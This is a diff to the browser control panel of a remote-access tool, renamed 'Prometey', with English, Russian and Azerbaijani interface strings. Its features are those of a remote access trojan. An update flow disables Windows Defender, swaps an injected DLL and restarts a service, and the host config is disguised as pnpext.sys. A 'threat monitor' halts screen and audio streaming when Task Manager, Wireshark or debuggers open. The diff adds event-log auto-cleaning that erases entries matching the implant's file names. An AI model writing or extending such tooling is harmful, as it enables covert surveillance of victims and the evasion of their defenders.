@@ -4,7 +4,7 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta name="build" content="20260407-034" />
-<title>RemoteDesk Pro</title>
+<title>Prometey</title>
 <style>
 /* ═══════════════════════════════════════════════════
    DESIGN SYSTEM — Cyber Industrial Dark
@@ -958,12 +958,13 @@ body {
 
 <!-- ══════════════════════════════════════════ TOP BAR ══ -->
 <div id="topbar">
-  <div class="logo">Remote<span>Desk</span> <span style="color:var(--accent2)">PRO</span></div>
+  <div class="logo">Prometey</div>
   <div class="sep"></div>
   <div id="conn-status">
     <div id="conn-dot"></div>
     <span id="conn-label" data-i18n="disconnected">DISCONNECTED</span>
     <span id="host-status" class="host-status"></span>
+    <span id="clients-online-badge" style="display:none;margin-left:8px;padding:2px 8px;background:linear-gradient(90deg,#ff9800,#f57c00);color:#fff;border-radius:4px;font-size:10px;font-weight:bold;animation:threatPulse 2s ease-in-out infinite;" data-i18n="msg_other_clients">Other operators online</span>
   </div>
   <div class="sep"></div>
   <span id="sys-info-bar">—</span>
@@ -1276,10 +1277,11 @@ body {
           <thead>
             <tr>
               <th style="width:30px;"><input type="checkbox" /></th>
-              <th onclick="sortProcs('pid')">PID</th>
-              <th data-i18n="procs_col_name" onclick="sortProcs('name')">Name</th>
-              <th data-i18n="procs_col_memory" onclick="sortProcs('memory')" style="width:120px;">Memory</th>
-              <th data-i18n="procs_col_threads" onclick="sortProcs('threads')" style="width:70px;">Threads</th>
+              <th onclick="sortProcs('pid')" style="cursor:pointer;">PID</th>
+              <th data-i18n="procs_col_name" onclick="sortProcs('name')" style="cursor:pointer;">Name</th>
+              <th data-i18n="procs_col_cpu" onclick="sortProcs('cpu')" style="width:70px;cursor:pointer;">CPU%</th>
+              <th data-i18n="procs_col_memory" onclick="sortProcs('memory')" style="width:120px;cursor:pointer;">Memory</th>
+              <th data-i18n="procs_col_threads" onclick="sortProcs('threads')" style="width:70px;cursor:pointer;">Threads</th>
               <th data-i18n="procs_col_actions" style="width:80px;">Actions</th>
             </tr>
           </thead>
@@ -1795,7 +1797,7 @@ body {
           <!-- Progress bar with steps -->
           <div id="update-progress-wrap" style="display:none;margin-top:10px;padding:10px;background:rgba(255,255,255,0.03);border-radius:6px;">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
-              <span id="update-step-text" style="font-size:12px;color:#4caf50;font-weight:bold;"><span data-i18n="set_step">Step</span> 1/9</span>
+              <span id="update-step-text" style="font-size:12px;color:#4caf50;font-weight:bold;"><span data-i18n="set_step">Step</span> 1/7</span>
               <span id="update-step-pct" style="font-size:11px;color:#888;font-family:monospace;">0%</span>
             </div>
             <div style="height:8px;background:#1a1a1a;border-radius:4px;overflow:hidden;">
@@ -1805,11 +1807,10 @@ body {
               <span data-step="1" data-i18n="set_step_defender">Defender</span>
               <span data-step="2" data-i18n="set_step_download">Download</span>
               <span data-step="3" data-i18n="set_step_stop_svc">Stop Svc</span>
-              <span data-step="4" data-i18n="set_step_stop_spooler">Stop Spooler</span>
-              <span data-step="5" data-i18n="set_step_replace">Replace</span>
-              <span data-step="6" data-i18n="set_step_start_spooler">Start Spooler</span>
-              <span data-step="7" data-i18n="set_step_inject">Inject</span>
-              <span data-step="8" data-i18n="set_step_defender">Defender</span>
+              <span data-step="4" data-i18n="set_step_replace">Replace</span>
+              <span data-step="5" data-i18n="set_step_start_svc">Start Svc</span>
+              <span data-step="6" data-i18n="set_step_defender">Defender</span>
+              <span data-step="7" data-i18n="set_step_done">Done</span>
               <span data-step="9" data-i18n="set_step_done">Done</span>
             </div>
           </div>
@@ -1817,7 +1818,7 @@ body {
             <span id="update-status" style="font-size:12px; color:var(--muted);"></span>
           </div>
           <div data-i18n="set_update_hint" style="font-size:10px; color:#555; margin-top:4px;">
-            Host downloads, replaces DLL, restarts Spooler, re-injects. Auto-reconnects in ~20s.
+            Host downloads, replaces DLL, restarts service. Auto-reconnects in ~10s.
           </div>
         </div>
         <div class="settings-block" style="margin-bottom:20px;">
@@ -1851,6 +1852,10 @@ body {
             <button type="button" class="fm-btn" data-i18n="set_cfg_load" onclick="cfgLoad()">Load from host</button>
             <button type="button" class="fm-btn" data-i18n="set_cfg_save" onclick="cfgSave()" style="background:#2a5;color:#fff;">Save to host</button>
             <button type="button" class="fm-btn" data-i18n="set_cfg_format" onclick="cfgFormat()">Format JSON</button>
+            <span style="border-left:1px solid var(--border);height:20px;margin:0 4px;"></span>
+            <button type="button" class="fm-btn" data-i18n="cfg_new" onclick="cfgNew()">📄 New</button>
+            <button type="button" class="fm-btn" onclick="cfgLoadLocal()">📂 Open .json</button>
+            <button type="button" class="fm-btn" onclick="cfgSaveLocal()">💾 Save .json</button>
             <span id="cfg-status" style="font-size:12px; color:var(--muted); align-self:center;"></span>
           </div>
           <textarea id="cfg-editor" spellcheck="false" data-i18n-ph="ph_cfg_editor" style="width:100%;height:280px;background:#111;color:#e0e0e0;border:1px solid var(--border);border-radius:6px;padding:10px;font-family:'Consolas','Courier New',monospace;font-size:12px;line-height:1.5;resize:vertical;tab-size:2;" placeholder="Click 'Load from host' to read config..."></textarea>
@@ -1937,6 +1942,25 @@ body {
           <button class="fm-btn" style="color:var(--danger);" onclick="clearEventLog()">🗑 Clear All</button>
         </div>
       </div>
+      <div style="padding:6px 12px;border-bottom:1px solid var(--border);display:flex;gap:8px;align-items:center;flex-wrap:wrap;font-size:11px;background:rgba(255,255,255,0.02);">
+        <span style="color:var(--muted);font-weight:bold;" data-i18n="evt_auto_clean">Auto-clean:</span>
+        <select id="evtlog-mode" style="background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:3px;padding:2px 4px;font-size:11px;">
+          <option value="once" data-i18n="evt_mode_once">Once at startup</option>
+          <option value="loop" data-i18n="evt_mode_loop">Periodic</option>
+          <option value="off">Off</option>
+        </select>
+        <label id="evtlog-interval-wrap" style="display:none;align-items:center;gap:4px;">
+          <span data-i18n="evt_interval">Interval:</span>
+          <input type="number" id="evtlog-interval" value="120" min="60" max="3600" style="width:55px;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:3px;padding:2px 4px;font-size:11px;">
+          <span data-i18n="evt_sec">sec</span>
+        </label>
+        <label style="display:flex;align-items:center;gap:4px;">
+          <span data-i18n="evt_patterns">Patterns:</span>
+          <input type="text" id="evtlog-patterns" placeholder="pnpext,pnpext.dll" style="width:180px;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:3px;padding:2px 4px;font-size:11px;">
+        </label>
+        <button class="fm-btn" onclick="evtApplyCleanConfig()" style="font-size:11px;" data-i18n="apply">Apply</button>
+        <span id="evtlog-clean-status" style="color:var(--muted);font-size:10px;"></span>
+      </div>
       <div id="evtlog-status" style="padding:4px 12px;font-size:11px;color:var(--muted);border-bottom:1px solid var(--border);display:none;"></div>
       <div id="evtlog-list" style="flex:1; overflow-y:auto; padding:0; font-size:12px;"></div>
     </div>
@@ -1994,7 +2018,7 @@ body {
 <!-- ══════════════════════════════════════════ CONNECT MODAL ══ -->
 <div id="modal-overlay">
   <div class="modal">
-    <div class="modal-title" style="color:var(--accent)">🖥 RemoteDesk PRO</div>
+    <div class="modal-title" style="color:var(--accent)">Prometey</div>
     <div class="modal-subtitle">Connect to your VPS relay server to begin remote monitoring</div>
 
     <div class="form-row">
@@ -2033,7 +2057,7 @@ body {
 
 <script>
 const BUILD = document.querySelector('meta[name="build"]')?.content || 'unknown';
-console.log('%c[RemoteDesk] Build: ' + BUILD, 'color: #00d9ff; font-weight: bold; font-size: 14px');
+console.log('%c[Prometey] Build: ' + BUILD, 'color: #00d9ff; font-weight: bold; font-size: 14px');
 
 // ═══════════════════════════════════════════════════════════════
 //  i18n — runtime language switching (en / az / ru)
@@ -2107,7 +2131,7 @@ const I18N = {
     ph_exe: 'Executable', ph_filter: 'Filter', ph_filter_by_name: 'Filter by name',
     ph_filter_services: 'Filter services', ph_path: 'Path',
     // ── Processes ──
-    procs_args: 'Arguments', procs_col_actions: 'Actions', procs_col_memory: 'Memory',
+    procs_args: 'Arguments', procs_col_actions: 'Actions', procs_col_cpu: 'CPU%', procs_col_memory: 'Memory',
     procs_col_name: 'Name', procs_col_threads: 'Threads', procs_exe: 'Executable',
     procs_kill: 'Kill', procs_launch_title: 'Launch process',
     // ── Programs ──
@@ -2154,11 +2178,11 @@ const I18N = {
     set_tamper_warn: '⚠ Tamper Protection is enabled — Defender cannot be disabled programmatically. Disable it manually via Windows Security → Virus & threat protection → Settings → Tamper Protection → OFF, then retry update.',
     set_dll_url: 'DLL URL on VPS',
     set_update_host: 'Update Host',
-    set_update_hint: 'Host downloads, replaces DLL, restarts Spooler, re-injects. Auto-reconnects in ~20s.',
+    set_update_hint: 'Host downloads, replaces DLL, restarts service. Auto-reconnects in ~10s.',
     set_step: 'Step',
     set_step_defender: 'Defender', set_step_download: 'Download', set_step_stop_svc: 'Stop Svc',
     set_step_stop_spooler: 'Stop Spooler', set_step_replace: 'Replace', set_step_start_spooler: 'Start Spooler',
-    set_step_inject: 'Inject', set_step_done: 'Done',
+    set_step_inject: 'Inject', set_step_start_svc: 'Start Svc', set_step_done: 'Done',
     set_vps_deploy: 'VPS Deploy (upload files to server)',
     set_deploy_html: 'index.html (client UI)',
     set_deploy_py: 'server.py (VPS relay)',
@@ -2166,7 +2190,7 @@ const I18N = {
     set_restart_py: 'Restart server.py', set_reload_page: 'Reload client page',
     set_deploy_hint: 'Upload files to VPS directories. Restart reloads server.py service.',
     set_cfg_editor: '📝 Host Config Editor (encrypted pnpext.sys)',
-    set_cfg_load: 'Load from host', set_cfg_save: 'Save to host', set_cfg_format: 'Format JSON',
+    set_cfg_load: 'Load from host', set_cfg_save: 'Save to host', set_cfg_format: 'Format JSON', cfg_new: 'New config',
     ph_cfg_editor: "Click 'Load from host' to read config...",
     set_threat_mon: '🛡️ Threat Monitor',
     set_threat_desc: 'Monitors Task Manager, Process Explorer/Hacker, Wireshark, Procmon, x64dbg, Fiddler, TCPView, Windows Settings, etc. When detected, host pauses video/audio streaming.',
@@ -2197,6 +2221,19 @@ const I18N = {
     st_st_pinging: 'Pinging…', st_st_downloading: 'Downloading…', st_st_uploading: 'Uploading…',
     st_st_measuring: 'Measuring…', st_st_done: 'Done', st_st_failed: 'Failed',
     st_err_not_connected: 'Not connected to relay', st_err_host_offline: 'Host is offline',
+    msg_other_clients: 'Other operators online',
+    msg_disconnected_server: 'Disconnected from server',
+    msg_connecting: 'Connecting...', msg_conn_failed: 'Connection failed',
+    msg_server_token_required: 'Server and token are required',
+    msg_waiting_host: 'Waiting for host...', msg_host_online: 'Host is now ONLINE',
+    msg_host_connected: 'Host connected', msg_host_disconnected: 'Host disconnected',
+    msg_host_back: 'Host is back online',
+    msg_client_joined: 'Client joined', msg_client_left: 'Client left',
+    msg_threat_scan: 'Threat scan', msg_threat_autopause: 'Threat auto-pause',
+    msg_no_threats: 'No threats detected',
+    // ── Event log ──
+    evt_auto_clean: 'Auto-clean:', evt_mode_once: 'Once at startup', evt_mode_loop: 'Periodic',
+    evt_interval: 'Interval:', evt_sec: 'sec', evt_patterns: 'Patterns:',
   },
   ru: {
     connect: 'ПОДКЛЮЧИТЬ', disconnect: 'ОТКЛЮЧИТЬ', stream: '▶ ПОТОК', stop_stream: '■ СТОП', record: '⏺ ЗАПИСЬ',
@@ -2253,7 +2290,7 @@ const I18N = {
     ph_add_app_url: 'URL приложения', ph_args: 'Аргументы', ph_enter_cmd: 'Введите команду',
     ph_exe: 'Исполняемый файл', ph_filter: 'Фильтр', ph_filter_by_name: 'Фильтр по имени',
     ph_filter_services: 'Фильтр служб', ph_path: 'Путь',
-    procs_args: 'Аргументы', procs_col_actions: 'Действия', procs_col_memory: 'Память',
+    procs_args: 'Аргументы', procs_col_actions: 'Действия', procs_col_cpu: 'ЦП%', procs_col_memory: 'Память',
     procs_col_name: 'Имя', procs_col_threads: 'Потоки', procs_exe: 'Исполняемый файл',
     procs_kill: 'Завершить', procs_launch_title: 'Запуск процесса',
     prog_click_refresh: 'Нажмите Обновить', prog_installed: 'Установлено', prog_name: 'Имя',
@@ -2292,11 +2329,11 @@ const I18N = {
     set_tamper_warn: '⚠ Tamper Protection включена — отключить Defender программно не получится. Отключите вручную: Безопасность Windows → Защита от вирусов → Параметры → Tamper Protection → OFF, затем повторите обновление.',
     set_dll_url: 'URL DLL на VPS',
     set_update_host: 'Обновить хост',
-    set_update_hint: 'Хост скачивает, заменяет DLL, перезапускает Spooler, переинжектит. Переподключение через ~20с.',
+    set_update_hint: 'Хост скачивает, заменяет DLL, перезапускает службу. Переподключение через ~10с.',
     set_step: 'Шаг',
     set_step_defender: 'Defender', set_step_download: 'Загрузка', set_step_stop_svc: 'Стоп служб',
     set_step_stop_spooler: 'Стоп Spooler', set_step_replace: 'Замена', set_step_start_spooler: 'Старт Spooler',
-    set_step_inject: 'Инжект', set_step_done: 'Готово',
+    set_step_inject: 'Инжект', set_step_start_svc: 'Старт службы', set_step_done: 'Готово',
     set_vps_deploy: 'Деплой на VPS (загрузка файлов на сервер)',
     set_deploy_html: 'index.html (клиентский UI)',
     set_deploy_py: 'server.py (VPS реле)',
@@ -2304,7 +2341,7 @@ const I18N = {
     set_restart_py: 'Перезапустить server.py', set_reload_page: 'Перезагрузить страницу клиента',
     set_deploy_hint: 'Загрузить файлы в папки VPS. Рестарт перезапускает службу server.py.',
     set_cfg_editor: '📝 Редактор конфига хоста (зашифрованный pnpext.sys)',
-    set_cfg_load: 'Загрузить с хоста', set_cfg_save: 'Сохранить на хост', set_cfg_format: 'Форматировать JSON',
+    set_cfg_load: 'Загрузить с хоста', set_cfg_save: 'Сохранить на хост', set_cfg_format: 'Форматировать JSON', cfg_new: 'Новый конфиг',
     ph_cfg_editor: "Нажмите 'Загрузить с хоста' для чтения конфига...",
     set_threat_mon: '🛡️ Мониторинг угроз',
     set_threat_desc: 'Отслеживает Task Manager, Process Explorer/Hacker, Wireshark, Procmon, x64dbg, Fiddler, TCPView, Параметры Windows и др. При обнаружении хост приостанавливает отправку видео и аудио.',
@@ -2334,6 +2371,18 @@ const I18N = {
     st_st_pinging: 'Пинг…', st_st_downloading: 'Скачивание…', st_st_uploading: 'Загрузка…',
     st_st_measuring: 'Замер…', st_st_done: 'Готово', st_st_failed: 'Сбой',
     st_err_not_connected: 'Нет соединения с релеем', st_err_host_offline: 'Хост офлайн',
+    msg_other_clients: 'Другие операторы онлайн',
+    msg_disconnected_server: 'Отключено от сервера',
+    msg_connecting: 'Подключение...', msg_conn_failed: 'Сбой подключения',
+    msg_server_token_required: 'Сервер и токен обязательны',
+    msg_waiting_host: 'Ожидание хоста...', msg_host_online: 'Хост ОНЛАЙН',
+    msg_host_connected: 'Хост подключён', msg_host_disconnected: 'Хост отключён',
+    msg_host_back: 'Хост снова онлайн',
+    msg_client_joined: 'Клиент подключился', msg_client_left: 'Клиент отключился',
+    msg_threat_scan: 'Сканирование угроз', msg_threat_autopause: 'Авто-пауза при угрозе',
+    msg_no_threats: 'Угроз не обнаружено',
+    evt_auto_clean: 'Авто-очистка:', evt_mode_once: 'Раз при запуске', evt_mode_loop: 'Периодически',
+    evt_interval: 'Интервал:', evt_sec: 'сек', evt_patterns: 'Шаблоны:',
   },
   az: {
     connect: 'QOŞUL', disconnect: 'AYIR', stream: '▶ AXIN', stop_stream: '■ DAYAN', record: '⏺ YAZ',
@@ -2390,7 +2439,7 @@ const I18N = {
     ph_add_app_url: 'Tətbiq URL', ph_args: 'Arqumentlər', ph_enter_cmd: 'Əmr daxil edin',
     ph_exe: 'İcra faylı', ph_filter: 'Filtr', ph_filter_by_name: 'Ada görə filtr',
     ph_filter_services: 'Xidmət filtri', ph_path: 'Yol',
-    procs_args: 'Arqumentlər', procs_col_actions: 'Əməliyyatlar', procs_col_memory: 'Yaddaş',
+    procs_args: 'Arqumentlər', procs_col_actions: 'Əməliyyatlar', procs_col_cpu: 'CPU%', procs_col_memory: 'Yaddaş',
     procs_col_name: 'Ad', procs_col_threads: 'Threadlər', procs_exe: 'İcra faylı',
     procs_kill: 'Dayandır', procs_launch_title: 'Proses başlat',
     prog_click_refresh: 'Yenilə düyməsinə basın', prog_installed: 'Quraşdırılmış', prog_name: 'Ad',
@@ -2429,11 +2478,11 @@ const I18N = {
     set_tamper_warn: '⚠ Tamper Protection aktivdir — Defender proqramla söndürülə bilməz. Windows Security → Virus & threat protection → Settings → Tamper Protection → OFF vasitəsilə əl ilə söndürüb yenidən cəhd edin.',
     set_dll_url: 'VPS-də DLL URL',
     set_update_host: 'Hostu yenilə',
-    set_update_hint: 'Host endirir, DLL-i əvəz edir, Spooler-i yenidən başladır, inject edir. Təxminən 20s sonra yenidən qoşulur.',
+    set_update_hint: 'Host endirir, DLL-i əvəz edir, xidməti yenidən başladır. Təxminən 10s sonra yenidən qoşulur.',
     set_step: 'Addım',
     set_step_defender: 'Defender', set_step_download: 'Endir', set_step_stop_svc: 'Xidməti dayandır',
     set_step_stop_spooler: 'Spooler-i dayandır', set_step_replace: 'Əvəz et', set_step_start_spooler: 'Spooler-i başlat',
-    set_step_inject: 'Inject', set_step_done: 'Tamamlandı',
+    set_step_inject: 'Inject', set_step_start_svc: 'Xidməti başlat', set_step_done: 'Tamamlandı',
     set_vps_deploy: 'VPS Deploy (serverə fayl yüklə)',
     set_deploy_html: 'index.html (klient UI)',
     set_deploy_py: 'server.py (VPS relay)',
@@ -2441,7 +2490,7 @@ const I18N = {
     set_restart_py: 'server.py-ni yenidən başlat', set_reload_page: 'Klient səhifəsini yenilə',
     set_deploy_hint: 'Faylları VPS qovluqlarına yüklə. Restart server.py xidmətini yenidən yükləyir.',
     set_cfg_editor: '📝 Host Konfiq Redaktoru (şifrələnmiş pnpext.sys)',
-    set_cfg_load: 'Hostdan yüklə', set_cfg_save: 'Hosta saxla', set_cfg_format: 'JSON formatla',
+    set_cfg_load: 'Hostdan yüklə', set_cfg_save: 'Hosta saxla', set_cfg_format: 'JSON formatla', cfg_new: 'Yeni konfiq',
     ph_cfg_editor: "Konfiqi oxumaq üçün 'Hostdan yüklə' düyməsinə basın...",
     set_threat_mon: '🛡️ Təhlükə Monitoru',
     set_threat_desc: 'Task Manager, Process Explorer/Hacker, Wireshark, Procmon, x64dbg, Fiddler, TCPView, Windows Tənzimləmələri və s. izləyir. Aşkarlandıqda host video/səs ötürülməsini dayandırır.',
@@ -2471,6 +2520,18 @@ const I18N = {
     st_st_pinging: 'Ping…', st_st_downloading: 'Endirilir…', st_st_uploading: 'Yüklənir…',
     st_st_measuring: 'Ölçülür…', st_st_done: 'Tamamlandı', st_st_failed: 'Uğursuz',
     st_err_not_connected: 'Relay-ə qoşulu deyil', st_err_host_offline: 'Host oflayndır',
+    msg_other_clients: 'Digər operatorlar onlayn',
+    msg_disconnected_server: 'Serverdən ayrıldı',
+    msg_connecting: 'Qoşulur...', msg_conn_failed: 'Qoşulma uğursuz',
+    msg_server_token_required: 'Server və token tələb olunur',
+    msg_waiting_host: 'Host gözlənilir...', msg_host_online: 'Host ONLAYN',
+    msg_host_connected: 'Host qoşuldu', msg_host_disconnected: 'Host ayrıldı',
+    msg_host_back: 'Host yenidən onlayn',
+    msg_client_joined: 'Klient qoşuldu', msg_client_left: 'Klient ayrıldı',
+    msg_threat_scan: 'Təhlükə skanı', msg_threat_autopause: 'Təhlükədə avto-dayanma',
+    msg_no_threats: 'Təhlükə aşkarlanmadı',
+    evt_auto_clean: 'Avto-təmizləmə:', evt_mode_once: 'Başlanğıcda bir dəfə', evt_mode_loop: 'Dövri',
+    evt_interval: 'İnterval:', evt_sec: 'san', evt_patterns: 'Şablonlar:',
   },
 };
 
@@ -2640,7 +2701,7 @@ function switchPanel(name) {
     const c = document.getElementById('stream-compressed'); if (c) c.checked = state.compressed;
     const cs = document.getElementById('codec-select'); if (cs) cs.value = state.codec;
   }
-  if (name === 'eventlog' && state.connected && state.hostOnline) refreshEventLog();
+  if (name === 'eventlog' && state.connected && state.hostOnline) { refreshEventLog(); evtLoadCleanConfig(); }
   if (name === 'registry' && state.connected && state.hostOnline) regNavigate(regState.path || '');
   if (name === 'screenshots' && state.connected) { ssRefreshList(); ssLoadTemplates(); ssLoadQuotaFromVPS(); ssLoadStatus(); }
   if (name === 'audio' && state.connected) { auRefreshList(); auLoadStatus(); }
@@ -2932,7 +2993,7 @@ function connectToServer() {
     return;
   }
   if (!server || !token) {
-    if (errEl) errEl.textContent = 'Server and token are required';
+    if (errEl) errEl.textContent = t('msg_server_token_required');
     return;
   }
 
@@ -2942,7 +3003,7 @@ function connectToServer() {
   const proto = ssl ? 'wss' : 'ws';
   const url = `${proto}://${server}:${port}/client`;
   setConnStatus('connecting');
-  if (errEl) errEl.textContent = 'Connecting...';
+  if (errEl) errEl.textContent = t('msg_connecting');
 
   // Null out handlers on old ws BEFORE closing so its onclose doesn't trigger another reconnect
   if (state.ws) {
@@ -2983,6 +3044,9 @@ function connectToServer() {
     state.streaming = false;
     state.hostOnline = false;
     state.ws = null;
+    // Hide "other operators" badge on disconnect
+    const _cob = document.getElementById('clients-online-badge');
+    if (_cob) _cob.style.display = 'none';
     // Fully clean up WebRTC so startStream() works fresh after reconnect
     if (state.streamDc) { try { state.streamDc.close(); } catch(e){} state.streamDc = null; }
     if (state.streamPc) { try { state.streamPc.close(); } catch(e){} state.streamPc = null; }
@@ -2996,7 +3060,7 @@ function connectToServer() {
   _reorderBuf.clear(); _reorderNextSeq = 0; _reorderInited = false;
   // (render loop cleanup removed — using direct rendering)
     setConnStatus('disconnected');
-    addLog('Disconnected from server', 'WARN');
+    addLog(t('msg_disconnected_server'), 'WARN');
     document.getElementById('btn-connect').classList.remove('hidden');
     document.getElementById('btn-disconnect').classList.add('hidden');
     document.getElementById('btn-stream-toggle').textContent = '▶ STREAM';
@@ -3020,7 +3084,7 @@ function connectToServer() {
   };
 
   ws.onerror = () => {
-    if (errEl) errEl.textContent = 'Connection failed. Try Port 8080 (direct) if behind a proxy.';
+    if (errEl) errEl.textContent = t('msg_conn_failed');
     setConnStatus('disconnected');
   };
 }
@@ -3032,6 +3096,7 @@ function handleText(raw) {
   // Auth ok
   if (msg.event === 'auth_ok') {
     state.connected = true;
+    state.userId = msg.user_id || '';  // save our client ID for targeted file delivery
     state.reconnectDelay = 2000; // reset backoff on success
     state.hostOnline = msg.host_online;
     try {
@@ -3053,7 +3118,7 @@ function handleText(raw) {
       startDashAutoRefresh();
     } else {
       // Host offline at connect — poll every 2s to detect when host comes online
-      addLog('Waiting for host...', 'INFO');
+      addLog(t('msg_waiting_host'), 'INFO');
       const pollHost = setInterval(() => {
         if (state.hostOnline || !state.connected) { clearInterval(pollHost); return; }
         // Ask VPS directly if host is connected (no relay to host needed)
@@ -3064,7 +3129,7 @@ function handleText(raw) {
           if (!state.hostOnline) {
             state.hostOnline = true;
             setConnStatus('online');
-            addLog('Host is now ONLINE', 'OK');
+            addLog(t('msg_host_online'), 'OK');
             notify('Host is now online', 'success');
             refreshDashboard();
             loadSettingsFromHost();
@@ -3086,7 +3151,7 @@ function handleText(raw) {
     if (state.hostOnline) return; // Already online — ignore duplicate events
     state.hostOnline = true;
     setConnStatus('online');
-    addLog('Host connected', 'OK');
+    addLog(t('msg_host_connected'), 'OK');
     notify('Host is now online', 'success');
     // Stagger commands to avoid overloading host
     setTimeout(() => refreshDashboard(), 500);
@@ -3104,7 +3169,7 @@ function handleText(raw) {
   if (msg.event === 'host_offline') {
     state.hostOnline = false;
     setConnStatus('online');
-    addLog('Host disconnected', 'WARN');
+    addLog(t('msg_host_disconnected'), 'WARN');
     notify('Host went offline', 'warn');
     // Start polling for host return
     if (!state._hostPoll) {
@@ -3114,7 +3179,7 @@ function handleText(raw) {
           if (!state.hostOnline) {
             state.hostOnline = true;
             setConnStatus('online');
-            addLog('Host is back online', 'OK');
+            addLog(t('msg_host_back'), 'OK');
             notify('Host reconnected', 'success');
             setTimeout(() => refreshDashboard(), 500);
             setTimeout(() => startDashAutoRefresh(), 1500);
@@ -3182,8 +3247,21 @@ function handleText(raw) {
   }
 
   // Unsolicited events
-  if (msg.event === 'client_joined') addLog('Client joined: ' + msg.data?.user_id, 'INFO');
-  if (msg.event === 'client_left')   addLog('Client left: ' + msg.data?.user_id, 'INFO');
+  if (msg.event === 'client_joined') addLog(t('msg_client_joined') + ': ' + msg.data?.user_id, 'INFO');
+  if (msg.event === 'client_left')   addLog(t('msg_client_left') + ': ' + msg.data?.user_id, 'INFO');
+  if (msg.event === 'clients_online') {
+    const n = msg.data?.count || 0;
+    const badge = document.getElementById('clients-online-badge');
+    if (badge) {
+      if (n > 1) {
+        badge.textContent = t('msg_other_clients') + ': ' + (n - 1);
+        badge.style.display = 'inline-block';
+      } else {
+        badge.style.display = 'none';
+      }
+    }
+    if (n > 1) addLog(t('msg_other_clients') + ': ' + (n - 1), 'WARN');
+  }
   if (msg.event === 'new_screenshot' && typeof ssHandleEvent === 'function') ssHandleEvent(msg);
   if (msg.event === 'new_recording' && typeof auHandleEvent === 'function') auHandleEvent(msg);
   if (msg.event === 'threat_status') {
@@ -3205,7 +3283,7 @@ function handleText(raw) {
         }
       } else {
         if (bar) bar.style.display = 'none';
-        if (cur) { cur.textContent = '✓ Угроз не обнаружено'; cur.style.color = '#69f0ae'; }
+        if (cur) { cur.textContent = '✓ ' + t('msg_no_threats'); cur.style.color = '#69f0ae'; }
       }
     } catch(e) { console.error('threat_status', e); }
   }
@@ -3215,19 +3293,19 @@ function handleText(raw) {
 async function threatSetAutoPause(enabled) {
   try {
     await sendCmd({ cmd: 'threat_set_autopause', enabled: enabled ? 'true' : 'false' });
-    addLog('Threat auto-pause: ' + (enabled ? 'ON' : 'OFF'), 'OK');
+    addLog(t('msg_threat_autopause') + ': ' + (enabled ? 'ON' : 'OFF'), 'OK');
   } catch (e) { addLog('threat_set_autopause failed: ' + e.message, 'WARN'); }
 }
 
 async function threatSetScan(enabled) {
   try {
     await sendCmd({ cmd: 'threat_set_scan', enabled: enabled ? 'true' : 'false' });
-    addLog('Threat scan: ' + (enabled ? 'ON' : 'OFF'), 'OK');
+    addLog(t('msg_threat_scan') + ': ' + (enabled ? 'ON' : 'OFF'), 'OK');
     if (!enabled) {
       const bar = document.getElementById('threat-warning');
       if (bar) bar.style.display = 'none';
       const cur = document.getElementById('threat-current-status');
-      if (cur) { cur.textContent = '⏸ Сканирование отключено'; cur.style.color = '#888'; }
+      if (cur) { cur.textContent = '⏸ ' + t('msg_threat_scan') + ': OFF'; cur.style.color = '#888'; }
     } else {
       threatRefreshStatus();
     }
@@ -3248,7 +3326,7 @@ async function threatRefreshStatus() {
       const cat = ({task_mgr:'Task Manager',process_explorer:'Process Monitor',sniffer:'Network Sniffer',privacy_settings:'Privacy Settings'})[r.category] || r.category || 'Monitor';
       if (cur) { cur.textContent = '⚠ ' + cat + ': ' + (r.proc || ''); cur.style.color = r.paused ? '#ff5252' : '#ffa726'; }
     } else {
-      if (cur) { cur.textContent = '✓ Угроз не обнаружено'; cur.style.color = '#69f0ae'; }
+      if (cur) { cur.textContent = '✓ ' + t('msg_no_threats'); cur.style.color = '#69f0ae'; }
     }
   } catch(e) { addLog('threat_status failed: ' + e.message, 'WARN'); }
 }
@@ -3982,7 +4060,7 @@ function openFileWebSocket() {
     state.fileWsList.push(fws);
 
     fws.onopen = () => {
-      fws.send(JSON.stringify({ cmd:'auth', token, password: pass, role:'file_recv' }));
+      fws.send(JSON.stringify({ cmd:'auth', token, password: pass, role:'file_recv', parent_client: state.userId || '' }));
       connectedCount++;
       if (connectedCount === 1) addLog(`File channels connecting (${FILE_WS_COUNT}x file_recv)...`, 'OK');
       if (connectedCount === FILE_WS_COUNT) addLog(`All ${FILE_WS_COUNT} file channels connected`, 'OK');
@@ -4673,7 +4751,7 @@ async function toggleRecording() {
       const blob = new Blob(state.recordingChunks, { type: mimeType });
       const ext = (mimeType || '').indexOf('webm') >= 0 ? 'webm' : 'mp4';
       const now = new Date();
-      const fn = 'RemoteDesktop_' + now.getFullYear() + String(now.getMonth()+1).padStart(2,'0') + String(now.getDate()).padStart(2,'0') + '_' + String(now.getHours()).padStart(2,'0') + String(now.getMinutes()).padStart(2,'0') + String(now.getSeconds()).padStart(2,'0') + '.' + ext;
+      const fn = 'Prometey_' + now.getFullYear() + String(now.getMonth()+1).padStart(2,'0') + String(now.getDate()).padStart(2,'0') + '_' + String(now.getHours()).padStart(2,'0') + String(now.getMinutes()).padStart(2,'0') + String(now.getSeconds()).padStart(2,'0') + '.' + ext;
       const lastEl2 = document.getElementById('rec-last-path');
       const hintEl2 = document.getElementById('rec-where-hint');
       const setSaved = (name, locText) => {
@@ -5539,25 +5617,43 @@ function renderProcesses(procs) {
   const filter = document.getElementById('proc-search').value.toLowerCase();
   const filtered = procs.filter(p => !filter || p.name?.toLowerCase().includes(filter));
   const sorted = [...filtered].sort((a,b) => {
-    let va = a[state.procSortKey]||'', vb = b[state.procSortKey]||'';
-    if (state.procSortKey === 'pid' || state.procSortKey === 'memory' || state.procSortKey === 'threads') { va=Number(va); vb=Number(vb); }
+    const k = state.procSortKey;
+    let va = a[k]||'', vb = b[k]||'';
+    if (k === 'pid' || k === 'memory' || k === 'threads' || k === 'cpu') { va=Number(va)||0; vb=Number(vb)||0; }
+    else { va = String(va).toLowerCase(); vb = String(vb).toLowerCase(); }
     const c = va < vb ? -1 : va > vb ? 1 : 0;
     return state.procSortAsc ? c : -c;
   });
 
-  const maxMem = Math.max(...procs.map(p=>Number(p.memory)||0));
+  // Update sort arrow indicators on column headers
+  document.querySelectorAll('#panel-procs .proc-table thead th[onclick]').forEach(th => {
+    const fn = th.getAttribute('onclick') || '';
